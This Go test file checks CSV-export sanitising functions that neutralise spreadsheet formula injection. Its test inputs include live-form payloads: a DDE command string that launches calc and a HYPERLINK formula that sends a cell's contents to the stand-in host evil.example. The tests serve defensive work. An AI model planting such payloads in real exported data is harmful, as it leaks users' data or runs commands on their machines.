package ui

import (
	"strings"
	"testing"

	"github.com/n0rdy/pooml/query"
)

func TestCSVSafe(t *testing.T) {
	tests := []struct {
		in   string
		want string
	}{
		{"", ""},
		{"payment declined", "payment declined"},
		{"=HYPERLINK(\"https://evil\",\"x\")", "'=HYPERLINK(\"https://evil\",\"x\")"},
		{"+1234567890", "+1234567890"}, // a positive number literal, harmless
		{"=1+1", "'=1+1"},              // = always a formula, never a number
		{"-2+cmd|'/c calc'!A1", "'-2+cmd|'/c calc'!A1"},
		{"-2+3", "'-2+3"}, // a formula, not a number
		{"@SUM(A1:A9)", "'@SUM(A1:A9)"},
		{"\tleading tab", "'\tleading tab"},
		{"\rleading cr", "'\rleading cr"},
		{"1.5", "1.5"},   // a bare number is not a formula trigger
		{"-1.5", "-1.5"}, // negative numbers stay numeric
		{"+3", "+3"},
	}
	for _, tt := range tests {
		if got := csvSafe(tt.in); got != tt.want {
			t.Errorf("csvSafe(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

// Column names come from aliases in the query text, so a crafted export link
// controls the header row.
func TestWriteCSVGuardsHeader(t *testing.T) {
	var b strings.Builder
	res := &query.Result{
		Columns: []string{`=HYPERLINK("http://evil.example/?"&A2,"click")`, "message"},
		Rows:    [][]any{{"svc", "=1+1"}},
	}
	if err := writeCSV(&b, res); err != nil {
		t.Fatal(err)
	}
	want := `"'=HYPERLINK(""http://evil.example/?""&A2,""click"")",message` + "\n" + `svc,'=1+1` + "\n"
	if b.String() != want {
		t.Fatalf("csv =\n%s\nwant\n%s", b.String(), want)
	}
}
